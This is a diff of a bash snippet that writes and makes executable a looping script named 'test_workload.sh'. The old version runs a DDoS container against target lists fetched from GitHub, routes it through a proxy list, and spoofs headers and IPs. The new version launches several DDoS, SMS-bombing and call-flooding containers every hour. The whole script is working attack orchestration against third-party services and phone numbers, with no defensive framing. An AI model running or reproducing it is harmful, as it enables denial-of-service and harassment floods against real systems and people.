@@ -1,5 +1,6 @@
 echo '#!/usr/bin/env bash
 
+
 # BEGIN VARS
 TIME_EACH="3600"  # duration for each run in seconds
 PID_PATH="/home/azureuser/n.pid"
@@ -8,11 +9,8 @@ LOG_PATH="$LOG_DIR/nukem.log"  # nukem run log path
 LOG_RETENTION=10            # how many logs to keep
 BACKUP_SUFFIX=$(date +"%F_%H%M") # log retention suffix
 
-# DDOSER_VARS
-TARG_URL="https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
-TARG_URL2="https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt"
-PROXY_URL="http://143.244.166.15/proxy.list"
-USER_AGENTS="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36"
+
+# END VARS
 
 
 # BEGIN FUNCTIONS
@@ -61,29 +59,19 @@ kill_stale
 run=1
 
 while :; do
-  rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
-  echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
-  echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
-  echo -e "$(date +"%F %H:%M") INFO: BEGIN RUN $run" | tee -a $LOG_PATH
-  docker run --pull always \
-          --ulimit nofile=100000:100000 \
-          -d --rm imsamurai/ddoser \
-          --concurrency 500 \
-          --timeout 20 \
-          --with-random-get-param \
-          --user-agent "$USER_AGENTS" \
-          --count 0 \
-          --log-to-stdout \
-          --target-urls-file $TARG_URL \
-          --target-urls-file $TARG_URL2 \
-          --proxy-url "http://143.244.166.15/proxy.list" \
-          --restart-period 600 \
-          --random-xff-ip | tee -a $LOG_PATH
-
-  sleep ${TIME_EACH}s
-  kill_stale
-  echo -e "$(date +"%F %H:%M") INFO: END RUN $run" | tee -a $LOG_PATH
-  run=$(($run+1))
+    rotate_file "${LOG_PATH}" $LOG_RETENTION "logs"
+    echo -e "==== START $(date +"%F %H:%M") ====\n" | tee -a $LOG_PATH
+    echo -e "$(date +"%F %H:%M") DEBUG: TIME_EACH=${TIME_EACH}s" | tee -a $LOG_PATH
+    echo -e "$(date +"%F %H:%M") INFO: BEGIN RUN $run" | tee -a $LOG_PATH
+    docker run -d --rm ghcr.io/opengs/uashield:master 512 true | tee -a $LOG_PATH
+    docker run -d --rm imsamurai/ivi | tee -a $LOG_PATH
+    docker run -d --rm geph/sms-bomber | tee -a $LOG_PATH
+    docker run -d --rm imsamurai/callmeback | tee -a $LOG_PATH
+    docker run -d --rm imsamurai/jerdesh | tee -a $LOG_PATH
+    sleep ${TIME_EACH}s
+    kill_stale
+    echo -e "$(date +"%F %H:%M") INFO: END RUN $run" | tee -a $LOG_PATH
+    run=$(($run+1))
 done' > /home/azureuser/test_workload.sh
 
 chmod +x /home/azureuser/test_workload.sh
